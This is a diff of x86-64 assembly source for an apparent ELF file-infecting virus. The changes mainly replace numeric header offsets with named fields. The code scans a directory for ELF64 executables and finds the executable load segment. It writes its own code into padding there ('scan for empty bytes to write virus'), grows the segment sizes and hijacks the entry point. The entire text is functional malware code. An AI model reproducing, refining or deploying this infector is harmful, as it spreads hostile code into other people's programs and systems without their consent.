@@ -53,7 +53,7 @@ _start:
                 mov         al, byte [rdi + rdx - 1]            ; file type
                 add         rdi, dirent.d_name                  ; pointer to filename
 .increment_idx:
-                add         r13, [rdi + rdx]                    ; increment dirent pointer
+                add         r13, rdx                    ; increment dirent pointer
                 cmp         al, DT_REG
                 jne         .nextfile
 
@@ -119,7 +119,7 @@ process:                                                        ; expecting file
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rsi, qword [rsp - (0x300+stat.st_size)]     ; linux st_size
+                mov         rsi, qword [rsp - (0x300-stat.st_size)]
                 mov         [rsp-0x120], rsi                    ; rsp-0x120 = infect_fsize
                 cmp         rsi, 0x1000                         ; file too small
                 jl          .close
@@ -165,10 +165,10 @@ is_valid_elf64:                                                 ; expecing data 
                 cmp         qword [rdi], rdx
                 jnz         .return
 .continue:      mov         rdx, ELF64_ET_DYN
-                cmp         qword [rdi + 0x10], rdx
+                cmp         qword [rdi + 16], rdx
                 jz          .ok
                 mov         rdx, ELF64_ET_EXEC
-                cmp         qword [rdi + 0x10], rdx
+                cmp         qword [rdi + 16], rdx
                 jnz         .return
 .ok:            inc         rax
 .return:        ret
@@ -180,28 +180,29 @@ insert_elf64:                                                   ; expecting data
 
                 mov         r15, rdi
 
-                mov         rdx, qword [r15 + 0x18]             ; entry point
-                mov         rax, qword [rdi + 0x20]             ; e_phoff
-                movzx       rcx, word [rdi + 0x38]              ; e_phnum                
+                mov         rdx, qword [rdi + elf64_ehdr.e_entry]
+                mov         rax, qword [rdi + elf64_ehdr.e_phoff]
+                movzx       rcx, word [rdi + elf64_ehdr.e_phnum]
                 add         rdi, rax                            ; rdi = *Elf64_Phdr
 .segment:       cmp         rcx, 0
                 jle         .return
                 mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
                 cmp         rax, qword [rdi]
                 jnz         .next
-                mov         rax, qword [rdi + 0x10]             ; p_vaddr
+                mov         rax, qword [rdi + elf64_phdr.p_vaddr]
                 cmp         rdx, rax
                 jb          .next
-                add         rax, qword [rdi + 0x28]             ; p_vaddr + p_memsz
+                add         rax, qword [rdi + elf64_phdr.p_memsz]
                 mov         r13, rax                            ; new entry point
                 cmp         rdx, rax
                 jae         .next
 
-                mov         rax, qword [rdi + 0x08]             ; rax = p_offset
-                add         rax, qword [rdi + 0x20]             ; rax += p_filesz
+                mov         rax, qword [rdi + elf64_phdr.p_offset]
+                add         rax, qword [rdi + elf64_phdr.p_filesz]
 
                 mov         r14, rdi                            ; code segment Elf64_Phdr*
 
+	; scan for empty bytes to write virus	
                 lea         rdi, [r15 + rax]                    ; data + p_offset + p_filesz
                 mov         rsi, rdi                            ; save: end of segment
                 xor         al, al
@@ -220,16 +221,16 @@ insert_elf64:                                                   ; expecting data
                                                                 ;r15 = beginning of file
                                                                 ;r14 = code segment header
                                                                 ;r13 = new entry point
-                mov         rax, qword [r15 + 0x18]             ; entry point
+                mov         rax, qword [r15 + elf64_ehdr.e_entry]
                 mov         qword [rdi - 8], rax                ; _finish - 8 = entry
                 mov         qword [rdi - 16], r13               ; _finish - 16 = pie_address
-                mov         qword [r15 + 0x18], r13             ; fix entry point
+                mov         qword [r15 + elf64_ehdr.e_entry], r13             ; fix entry point
                 mov         rax, _finish - _start
-                add         qword [r14 + 0x20], rax             ; increase p_filesz
-                add         qword [r14 + 0x28], rax             ; increase p_memsz
+                add         qword [r14 + elf64_phdr.p_filesz], rax             ; increase p_filesz
+                add         qword [r14 + elf64_phdr.p_memsz], rax             ; increase p_memsz
                 jmp         .return
 
-.next:          add         rdi, 0x38                           ; sizeof(Elf64_Phdr)
+.next:          add         rdi, elf64_phdr_size                           ; sizeof(Elf64_Phdr)
                 dec         rcx
                 jmp         .segment
 
